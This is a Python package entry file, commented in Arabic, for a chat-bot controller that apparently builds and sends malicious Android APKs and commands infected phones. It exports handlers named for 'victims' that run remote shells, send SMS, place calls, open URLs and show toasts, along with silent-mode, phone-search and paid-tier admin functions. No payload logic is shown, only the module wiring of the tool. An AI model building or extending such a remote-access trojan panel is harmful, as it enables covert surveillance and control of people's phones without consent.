# bot_handlers/__init__.py
# ============================================================
# نقطة الدخول — تصدير كل المعالجات
# ============================================================

# ─── الأوامر ───
from .commands.start import start_command
from .commands.dashboard import dashboard_command
from .commands.update import update_command
from .commands.silent import silent_command

# ─── الـ Router ───
from .callbacks.router import callback_handler

# ─── Steps ───
from .steps.search_steps import phone_search_input_handler
from .steps.silent_steps import silent_label_handler
from .steps.victim_steps import (
    victim_name_step,
    v_toast_step, v_shell_step, v_sendsms_step,
    v_call_step, v_url_step, v_rename_step,
    victim_name_handler,
)
from .steps.apk_steps import (
    apk_toast_step, apk_shell_step, apk_sendsms_step,
    apk_call_step, apk_url_step,
)
from .steps.update_steps import upd_target_handler
from .steps.admin_steps import (
    admin_search_handler,
    admin_broadcast_handler,
    admin_ban_handler,
    admin_unban_handler,
    admin_delete_handler,
    admin_grant_vip_handler,
    admin_give_stars_handler,
    admin_msg_user_handler,
)

# ─── Helpers (للتوافق مع main.py القديم) ───
from .helpers import h, safe_edit
from .keyboards import main_menu, main_menu_text
from .apk_builder import _build_and_send_apk


__all__ = [
    # Commands
    "start_command", "dashboard_command", "update_command", "silent_command",
    # Router
    "callback_handler",
    # Steps
    "phone_search_input_handler", "silent_label_handler",
    "victim_name_step",
    "v_toast_step", "v_shell_step", "v_sendsms_step",
    "v_call_step", "v_url_step", "v_rename_step",
    "victim_name_handler",
    "apk_toast_step", "apk_shell_step", "apk_sendsms_step",
    "apk_call_step", "apk_url_step",
    "upd_target_handler",
    "admin_search_handler", "admin_broadcast_handler",
    "admin_ban_handler", "admin_unban_handler", "admin_delete_handler",
    "admin_grant_vip_handler", "admin_give_stars_handler",
    "admin_msg_user_handler",
    # Helpers
    "h", "safe_edit", "main_menu", "main_menu_text",
    "_build_and_send_apk",
]
